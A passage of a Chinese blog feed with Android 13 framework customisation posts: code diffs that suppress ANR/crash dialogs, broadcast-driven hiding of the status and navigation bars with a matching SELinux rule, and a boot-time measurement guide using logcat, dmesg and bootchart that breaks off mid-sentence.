mProcessCrashShowDialogTimes.put(proc.processName, proc.uid, now);</span><br><span class="line">                     &#125;</span><br><span class="line">@@ -<span class="number">1099</span>,<span class="number">7</span> +<span class="number">1106</span>,<span class="number">11</span> @@ <span class="keyword">class</span> <span class="title class_">AppErrors</span> &#123;</span><br><span class="line">             <span class="keyword">if</span> (mService.mAtmInternal.canShowErrorDialogs() || showBackground) &#123;</span><br><span class="line">                 <span class="type">AnrController</span> <span class="variable">anrController</span> <span class="operator">=</span> errState.getDialogController().getAnrController();</span><br><span class="line">                 <span class="keyword">if</span> (anrController == <span class="literal">null</span>) &#123;</span><br><span class="line">-                    errState.getDialogController().showAnrDialogs(data);</span><br><span class="line">+                    <span class="comment">// Create by yeruilai 2024-8-29 15:57:56 Block ANR and Crash error dialogs</span></span><br><span class="line">+                    android.util.Log.d(TAG,<span class="string">&quot;yeruilai:AppErrors:showAnrDialogs:mShowDialog=&quot;</span> + mShowDialog);</span><br><span class="line">+                    <span class="keyword">if</span>(mShowDialog) &#123;</span><br><span class="line">+                        errState.getDialogController().showAnrDialogs(data);</span><br><span class="line">+                    &#125;</span><br><span class="line">                 &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     <span class="type">String</span> <span class="variable">packageName</span> <span class="operator">=</span> proc.info.packageName;</span><br><span class="line">                     <span class="type">int</span> <span class="variable">uid</span> <span class="operator">=</span> proc.info.uid;</span><br><span class="line">@@ -<span class="number">1108</span>,<span class="number">7</span> +<span class="number">1119</span>,<span class="number">11</span> @@ <span class="keyword">class</span> <span class="title class_">AppErrors</span> &#123;</span><br><span class="line">                     <span class="keyword">if</span> (showDialog) &#123;</span><br><span class="line">                         Slog.d(TAG, <span class="string">&quot;ANR delay completed. Showing ANR dialog for package: &quot;</span></span><br><span class="line">                                 + packageName);</span><br><span class="line">-                        errState.getDialogController().showAnrDialogs(data);</span><br><span class="line">+                        <span class="comment">// Create by yeruilai 2024-8-29 15:57:56 Block ANR and Crash error dialogs</span></span><br><span class="line">+                        android.util.Log.d(TAG,<span class="string">&quot;yeruilai:AppErrors:showAnrDialogs:mShowDialog=&quot;</span> + mShowDialog);</span><br><span class="line">+                        <span class="keyword">if</span>(mShowDialog) &#123;</span><br><span class="line">+                            errState.getDialogController().showAnrDialogs(data);</span><br><span class="line">+                        &#125;</span><br><span class="line">                     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                         Slog.d(TAG, <span class="string">&quot;ANR delay completed. Cancelling ANR dialog for package: &quot;</span></span><br><span class="line">                                 + packageName);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> ANR </tag>
            
            <tag> Crash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android13 动态控制状态栏和导航栏</title>
      <link href="/2024/08/24/2024-08-24/"/>
      <url>/2024/08/24/2024-08-24/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在Android系统中，状态栏（StatusBar）、导航栏（NavigationBar）以及下拉菜单（通常称为Notification Shade或Quick Settings Panel）构成了用户界面不可或缺的三个元素，它们共同为用户提供了丰富的信息显示与便捷的交互体验。具体而言，状态栏实时展示着时间、电池电量、信号强度等关键信息；导航栏则集成了如返回、主页及多任务管理等基础操作按钮；而下拉菜单则让用户能够迅速访问快速设置项及通知详情。</p><p>值得注意的是，尽管这些元素在多数Android设备上普遍存在且至关重要，但并非所有用户或应用场景都需要它们持续显示。因此，Android系统提供了灵活的配置选项，允许用户或开发者根据实际需求控制这些元素的显示与隐藏状态。</p><p>在Android 13中，对于导航栏的动态显示与隐藏控制相较于之前版本有了更为简化的处理方式。通过利用广播机制或其他系统接口，开发者可以更加便捷地实现这些高级定制功能，为用户带来更加个性化和流畅的使用体验。同时，这也意味着Android平台在持续优化其灵活性和可定制性，以更好地满足不同用户群体的多样化需求了。</p><h1 id="修改示例"><a href="#修改示例" class="headerlink" title="修改示例"></a>修改示例</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/packages/SystemUI/src/com/android/systemui/navigationbar/NavigationBarController.java b/frameworks/base/packages/SystemUI/src/com/android/systemui/navigationbar/NavigationBarController.java</span><br><span class="line">old mode <span class="number">100644</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">mode</span> <span class="number">100755</span></span><br><span class="line">index 5c8d2212cef..ffd22dc73b1</span><br><span class="line">--- a/frameworks/base/packages/SystemUI/src/com/android/systemui/navigationbar/NavigationBarController.java</span><br><span class="line">+++ b/frameworks/base/packages/SystemUI/src/com/android/systemui/navigationbar/NavigationBarController.java</span><br><span class="line">@@ -<span class="number">496</span>,<span class="number">4</span> +<span class="number">496</span>,<span class="number">15</span> @@ <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NavigationBarController</span> <span class="keyword">implements</span></span><br><span class="line">             <span class="title class_">mNavigationBars</span>.valueAt(i).dump(pw);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/**</span></span><br><span class="line"><span class="comment">+     * Create by yeruilai 2024-8-22 10:23:59 </span></span><br><span class="line"><span class="comment">+     */</span></span><br><span class="line">+    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeNavigationBars</span><span class="params">()</span> &#123;</span><br><span class="line">+        Display[] displays = mDisplayManager.getDisplays();</span><br><span class="line">+        <span class="keyword">for</span> (Display display : displays) &#123;</span><br><span class="line">+            removeNavigationBar(display.getDisplayId());</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line"> &#125;</span><br><span class="line">diff --git a/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/CentralSurfacesImpl.java b/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/CentralSurfacesImpl.java</span><br><span class="line">index f76470badf1..94cca11834b <span class="number">100755</span></span><br><span class="line">--- a/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/CentralSurfacesImpl.java</span><br><span class="line">+++ b/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/CentralSurfacesImpl.java</span><br><span class="line">@@ -<span class="number">286</span>,<span class="number">6</span> +<span class="number">286</span>,<span class="number">15</span> @@ <span class="keyword">import</span> dagger.Lazy;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CentralSurfacesImpl</span> <span class="keyword">extends</span> <span class="title class_">CoreStartable</span> <span class="keyword">implements</span></span><br><span class="line">         <span class="title class_">CentralSurfaces</span> &#123;</span><br><span class="line"> </span><br><span class="line">+    <span class="comment">// Create by yeruilai 2024-8-22 10:19:38 Dynamically display hidden navigation bar and status bar</span></span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ACTION_HIDE_STATUS_BAR</span> <span class="operator">=</span> <span class="string">&quot;com.systemui.statusbar.hide&quot;</span>;</span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ACTION_SHOW_STATUS_BAR</span> <span class="operator">=</span> <span class="string">&quot;com.systemui.statusbar.show&quot;</span>;</span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SYS_PROPERTY_STATUS_BAR</span> <span class="operator">=</span> <span class="string">&quot;persist.sys.statusbar.enable&quot;</span>;</span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ACTION_HIDE_NAVIGATION_BAR</span> <span class="operator">=</span> <span class="string">&quot;com.systemui.navigationbar.hide&quot;</span>;</span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ACTION_SHOW_NAVIGATION_BAR</span> <span class="operator">=</span> <span class="string">&quot;com.systemui.navigationbar.show&quot;</span>;</span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SYS_PROPERTY_NAVIGATION_BAR</span> <span class="operator">=</span> <span class="string">&quot;persist.sys.navigationbar.enable&quot;</span>;</span><br><span class="line">+    </span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BANNER_ACTION_CANCEL</span> <span class="operator">=</span></span><br><span class="line">             <span class="string">&quot;com.android.systemui.statusbar.banner_action_cancel&quot;</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BANNER_ACTION_SETUP</span> <span class="operator">=</span></span><br><span class="line">@@ -<span class="number">1522</span>,<span class="number">6</span> +<span class="number">1531</span>,<span class="number">12</span> @@ <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CentralSurfacesImpl</span> <span class="keyword">extends</span> <span class="title class_">CoreStartable</span> <span class="keyword">implements</span></span><br><span class="line">             <span class="title class_">filter</span>.addAction(UnisocPowerManagerUtil.ACTION_POWEREX_SAVE_MODE_CHANGED);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">/* @&#125; */</span></span><br><span class="line">+        <span class="comment">// Create by yeruilai 2024-8-22 10:19:38 Dynamically display hidden navigation bar and status bar</span></span><br><span class="line">+        filter.addAction(ACTION_HIDE_STATUS_BAR);</span><br><span class="line">+        filter.addAction(ACTION_SHOW_STATUS_BAR);</span><br><span class="line">+        filter.addAction(ACTION_HIDE_NAVIGATION_BAR);</span><br><span class="line">+        filter.addAction(ACTION_SHOW_NAVIGATION_BAR);</span><br><span class="line">+</span><br><span class="line">         mBroadcastDispatcher.registerReceiver(mBroadcastReceiver, filter, <span class="literal">null</span>, UserHandle.ALL);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">@@ -<span class="number">2543</span>,<span class="number">8</span> +<span class="number">2558</span>,<span class="number">8</span> @@ <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CentralSurfacesImpl</span> <span class="keyword">extends</span> <span class="title class_">CoreStartable</span> implements</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createAndAddWindows</span><span class="params">(<span class="meta">@Nullable</span> RegisterStatusBarResult result)</span> &#123;</span><br><span class="line">         makeStatusBarView(result);</span><br><span class="line">-        mNotificationShadeWindowController.attach();</span><br><span class="line">         mStatusBarWindowController.attach();</span><br><span class="line">+        mNotificationShadeWindowController.attach();</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// called by makeStatusbar and also by PhoneStatusBarView</span></span><br><span class="line">@@ -<span class="number">2870</span>,<span class="number">6</span> +<span class="number">2885</span>,<span class="number">29</span> @@ <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CentralSurfacesImpl</span> <span class="keyword">extends</span> <span class="title class_">CoreStartable</span> implements</span><br><span class="line">                     &amp;&amp; mDataSaverController.isDataSaverEnabled()) &#123;</span><br><span class="line">                 mDataSaverController.setDataSaverEnabled(<span class="literal">false</span>);</span><br><span class="line">             &#125;</span><br><span class="line">+            <span class="comment">// Create by yeruilai 2024-8-22 10:19:38 Dynamically display hidden navigation bar and status bar</span></span><br><span class="line">+             <span class="keyword">else</span> <span class="keyword">if</span>(ACTION_HIDE_STATUS_BAR.equals(action))&#123;</span><br><span class="line">+                android.util.Log.d(<span class="string">&quot;yeruilai&quot;</span>,<span class="string">&quot;yeruilai:action=&quot;</span> + ACTION_HIDE_STATUS_BAR);</span><br><span class="line">+</span><br><span class="line">+                mStatusBarWindowController.hideStatusBar();</span><br><span class="line">+                SystemProperties.set(SYS_PROPERTY_STATUS_BAR, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">+            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(ACTION_SHOW_STATUS_BAR.equals(action))&#123;</span><br><span class="line">+                android.util.Log.d(<span class="string">&quot;yeruilai&quot;</span>,<span class="string">&quot;yeruilai:action=&quot;</span> + ACTION_SHOW_STATUS_BAR);</span><br><span class="line">+</span><br><span class="line">+                mStatusBarWindowController.showStatusBar();</span><br><span class="line">+                SystemProperties.set(SYS_PROPERTY_STATUS_BAR, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">+            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(ACTION_HIDE_NAVIGATION_BAR.equals(action))&#123;</span><br><span class="line">+                android.util.Log.d(<span class="string">&quot;yeruilai&quot;</span>,<span class="string">&quot;yeruilai:action=&quot;</span> + ACTION_HIDE_NAVIGATION_BAR);</span><br><span class="line">+</span><br><span class="line">+                mNavigationBarController.removeNavigationBars();</span><br><span class="line">+                SystemProperties.set(SYS_PROPERTY_NAVIGATION_BAR, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">+            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(ACTION_SHOW_NAVIGATION_BAR.equals(action))&#123;</span><br><span class="line">+                android.util.Log.d(<span class="string">&quot;yeruilai&quot;</span>,<span class="string">&quot;yeruilai:action=&quot;</span> + ACTION_SHOW_NAVIGATION_BAR);</span><br><span class="line">+</span><br><span class="line">+                createNavigationBar(<span class="literal">null</span>);</span><br><span class="line">+                SystemProperties.set(SYS_PROPERTY_NAVIGATION_BAR, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">+            &#125;</span><br><span class="line">+</span><br><span class="line">             <span class="comment">/* @&#125; */</span></span><br><span class="line">             Trace.endSection();</span><br><span class="line">         &#125;</span><br><span class="line">diff --git a/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/window/StatusBarWindowController.java b/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/window/StatusBarWindowController.java</span><br><span class="line">old mode <span class="number">100644</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">mode</span> <span class="number">100755</span></span><br><span class="line">index e0d780a5fcd..08b4628f4c5</span><br><span class="line">--- a/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/window/StatusBarWindowController.java</span><br><span class="line">+++ b/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/window/StatusBarWindowController.java</span><br><span class="line">@@ -<span class="number">316</span>,<span class="number">4</span> +<span class="number">316</span>,<span class="number">42</span> @@ <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StatusBarWindowController</span> &#123;</span><br><span class="line">             mLpChanged.privateFlags &amp;= ~PRIVATE_FLAG_FORCE_SHOW_STATUS_BAR;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/**</span></span><br><span class="line"><span class="comment">+     * Create by yeruilai 2024-8-22 10:23:59 </span></span><br><span class="line"><span class="comment">+     */</span></span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(State state,<span class="type">boolean</span> isHideStatus)</span> &#123;</span><br><span class="line">+        <span class="keyword">if</span> (!mIsAttached) &#123;</span><br><span class="line">+            <span class="keyword">return</span>;</span><br><span class="line">+        &#125;</span><br><span class="line">+        applyForceStatusBarVisibleFlag(state);</span><br><span class="line">+        <span class="keyword">if</span> (!isHideStatus)&#123;</span><br><span class="line">+            applyHeight(state);</span><br><span class="line">+        &#125;</span><br><span class="line">+        <span class="keyword">if</span> (mLp != <span class="literal">null</span> &amp;&amp; mLp.copyFrom(mLpChanged) != <span class="number">0</span>) &#123;</span><br><span class="line">+            mWindowManager.updateViewLayout(mStatusBarWindowView, mLp);</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/**</span></span><br><span class="line"><span class="comment">+     * Create by yeruilai 2024-8-22 10:23:59 </span></span><br><span class="line"><span class="comment">+     */</span></span><br><span class="line">+    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showStatusBar</span><span class="params">()</span>&#123;</span><br><span class="line">+        apply(mCurrentState);</span><br><span class="line">+        mStatusBarWindowView.setVisibility(View.VISIBLE);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/**</span></span><br><span class="line"><span class="comment">+     * Create by yeruilai 2024-8-22 10:23:59 </span></span><br><span class="line"><span class="comment">+     */</span></span><br><span class="line">+    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hideStatusBar</span><span class="params">()</span>&#123;</span><br><span class="line">+        mStatusBarWindowView.setVisibility(View.GONE);</span><br><span class="line">+        mLpChanged.height = <span class="number">0</span>;</span><br><span class="line">+        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">rot</span> <span class="operator">=</span> Surface.ROTATION_0; rot &lt;= Surface.ROTATION_270; rot++) &#123;</span><br><span class="line">+            mLpChanged.paramsForRotation[rot].height = <span class="number">0</span>;</span><br><span class="line">+        &#125;</span><br><span class="line">+        apply(mCurrentState,<span class="literal">true</span>);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>添加相应的<strong>SELinux权限</strong>，代码示例如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/system/sepolicy/<span class="keyword">public</span>/platform_app.te b/system/sepolicy/<span class="keyword">public</span>/platform_app.te</span><br><span class="line">index 3f689d82481..21a1f30d29f <span class="number">100755</span></span><br><span class="line">--- a/system/sepolicy/<span class="keyword">public</span>/platform_app.te</span><br><span class="line">+++ b/system/sepolicy/<span class="keyword">public</span>/platform_app.te</span><br><span class="line">@@ -<span class="number">7</span>,<span class="number">3</span> +<span class="number">7</span>,<span class="number">5</span> @@ allow platform_app system_app_data_file:dir r_dir_perms;</span><br><span class="line"> allow platform_app system_app_data_file:file r_file_perms;</span><br><span class="line"> #redstone</span><br><span class="line"> type platform_app, domain;</span><br><span class="line">+</span><br><span class="line">+allow platform_app system_prop:property_service set;</span><br><span class="line">+</span><br><span class="line">diff --git a/system/sepolicy/prebuilts/api/<span class="number">33.0</span>/<span class="keyword">public</span>/platform_app.te b/system/sepolicy/prebuilts/api/<span class="number">33.0</span>/<span class="keyword">public</span>/platform_app.te</span><br><span class="line">index 3f689d82481..21a1f30d29f <span class="number">100755</span></span><br><span class="line">--- a/system/sepolicy/prebuilts/api/<span class="number">33.0</span>/<span class="keyword">public</span>/platform_app.te</span><br><span class="line">+++ b/system/sepolicy/prebuilts/api/<span class="number">33.0</span>/<span class="keyword">public</span>/platform_app.te</span><br><span class="line">@@ -<span class="number">7</span>,<span class="number">3</span> +<span class="number">7</span>,<span class="number">5</span> @@ allow platform_app system_app_data_file:dir r_dir_perms;</span><br><span class="line"> allow platform_app system_app_data_file:file r_file_perms;</span><br><span class="line"> #redstone</span><br><span class="line"> type platform_app, domain;</span><br><span class="line">+</span><br><span class="line">+allow platform_app system_prop:property_service set;</span><br><span class="line">+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android13 开机时间优化</title>
      <link href="/2024/03/16/2024-03-16/"/>
      <url>/2024/03/16/2024-03-16/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>实际生活当中，针对某些应用场景，对Android启动时间要求比较严格，比如车载，车都开出去几公里了，IVI系统还没起来，这就比较尴尬，所以，优化Android启动时间是一项非常重要的工作。本文将根据本人实际工作经验，详细讲述Android开机时间相关的内容，基于Android13。</p><h1 id="开机时间检测方法"><a href="#开机时间检测方法" class="headerlink" title="开机时间检测方法"></a>开机时间检测方法</h1><h4 id="logcat"><a href="#logcat" class="headerlink" title="logcat"></a>logcat</h4><p>长按power键开机，等待adb进程启动后（一般出现Android字样后），执行如下命令抓取开机logcat</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat -b all &gt; logcat.txt</span><br></pre></td></tr></table></figure><p>打开logcat.txt，搜索logcat关键字 <strong>”boot_progress“、“sf_stop_bootanim”、“wm_boot_animation_done”</strong> </p><p><img src="/images/20240316/20240316001.jpg"></p><p><img src="/images/20240316/20240316002.jpg"></p><p><img src="/images/20240316/20240316003.jpg"></p><p>或者直接执行以下命令过滤logcat</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat -b events | grep -E &quot;boot_progress|sf_stop_bootanim|wm_boot_animation_done&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/20240316/20240316004.jpg"></p><p>以上是Android系统启动的各个阶段耗时，可以看到，整个开机过程耗时23.283秒，其中从按下power键到zygote启动，耗时7.646秒。各阶段的解释如下：</p><table><thead><tr><th>启动阶段</th><th>说明</th></tr></thead><tbody><tr><td>boot_progress_start</td><td>Linux kernel启动到Zygote进程启动的时间，包含从kernel启动到Init启动Zygote的时间</td></tr><tr><td>boot_progress_preload_start</td><td>ART虚拟机启动耗时/Zygote开始启动</td></tr><tr><td>boot_progress_preload_end</td><td>虚拟机资源装载耗时/Zygote启动结束</td></tr><tr><td>boot_progress_system_run</td><td>System Server进程启动耗时</td></tr><tr><td>boot_progress_pms_start</td><td>Android一些在PMS前需要启动服务的启动耗时，package scan开始</td></tr><tr><td>boot_progress_pms_system_scan_start</td><td>system目录开始scan时间点</td></tr><tr><td>boot_progress_pms_data_scan_start</td><td>data目录开始scan时间点/system目录扫描耗时</td></tr><tr><td>boot_progress_pms_scan_end</td><td>扫描结束时间点/data目录扫描耗时</td></tr><tr><td>boot_progress_pms_ready</td><td>PMS启动扫描包耗时</td></tr><tr><td>boot_progress_ams_ready</td><td>PMS后的系统服务启动时间</td></tr><tr><td>boot_progress_enable_screen</td><td>AMS启动完成后开始激活屏幕</td></tr><tr><td>sf_stop_bootanim</td><td>surfaceflinger结束开机动画</td></tr><tr><td>wm_boot_animation_done</td><td>从enable_screen到animation_done包含壁纸和keyguard的绘制时间</td></tr></tbody></table><p>注意，logcat只能看到上层启动后的log，即zygote启动后，开机期间kernel层的耗时无法通过logcat观察。</p><h4 id="串口log和kernel-log"><a href="#串口log和kernel-log" class="headerlink" title="串口log和kernel log"></a>串口log和kernel log</h4><ul><li>串口log可以使用串口线连接Android设备和PC，使用串口工具抓取log，常用的串口工具有很多，xshell、MobaXterm等。</li><li>kernel log是在开机后执行如下命令抓取：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell dmesg &gt; dmesg.txt</span><br></pre></td></tr></table></figure><p>log里面搜关键字 <strong>“KPI” 、”first stage” 、”second stage”</strong> ，此关键字为kernel的各个启动阶段。<br>uart log和kernel log都可以显示整个开机过程时间。</p><p><img src="/images/20240316/20240316005.jpg"></p><p>左侧为启动时间轴，右侧为启动log。</p><h4 id="bootchart"><a href="#bootchart" class="headerlink" title="bootchart"></a>bootchart</h4><p>bootchart 是一个用于 linux 启动过程性能分析的开源工具软件，在系统启动过程中自动收集 CPU 占用率、磁盘吞吐率、进程等信息，并以图形方式显示分析结果，可用作指导优化系统启动过程。<br>bootchart 让用户可以很直观的查看系统启动的过程和各个过程耗费的时间，以便让用户能够分析启动过程，从而进行优化以提高启动时间。</p><ul><li>安装bootchart</li></ul><p>Ubuntu16.04和18.04可通过一下命令安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bootchart</span><br><span class="line">sudo apt-get install pybootchartgui </span><br></pre></td></tr></table></figure><p>Ubuntu20.04上无法定位<strong>pybootchartgui</strong></p><p><img src="/images/20240316/20240316006.jpg"></p><p>这时可以手动下载，然后放到python编译器搜寻的目录下。<br>下载地址：<a href="https://github.com/xrmx/bootchart/releases">github.com/xrmx/bootchart/releases</a><br>下载好后解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf bootchart-0.14.9.tar.gz</span><br></pre></td></tr></table></figure><p>得到目录<strong>bootchart-0.14.9</strong>，进入到该目录</p><p><img src="/images/20240316/20240316007.jpg"></p><p>将图中的<strong>pybootchartgui</strong>目录复制到 <strong>/usr/lib/python3.8/</strong> 目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp -r /usr/lib/python3.8/bootchart-0.14.9/pybootchartgui/ /usr/lib/python3.8/</span><br></pre></td></tr></table></figure><p> <strong>/usr/lib/python3.8/</strong> 是python编译器搜寻的目录之一，完整的搜寻目录列表可通过以下命令查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import sys;print(sys.path)&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/20240316/20240316008.jpg"></p><p>所以，我们可以将pybootchartgui目录复制到以上任意目录中，只要能被python编译器搜寻到即可。<br>最后还需要注意一下，复制完后需要将 <strong>main.py.in</strong> 重命名为 <strong>main.py</strong> ，否者会报如下错误，此问题在github的<a href="https://github.com/xrmx/bootchart/issues/97">issue</a>中有提到</p><p><img src="/images/20240316/20240316009.jpg"></p><p>重命名命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv /usr/lib/python3.8/pybootchartgui/main.py.in /usr/lib/python3.8/pybootchartgui/main.py</span><br></pre></td></tr></table></figure><p>最后我们将<strong>bootchart</strong>和<strong>pybootchartgui</strong>这两个文件复制到 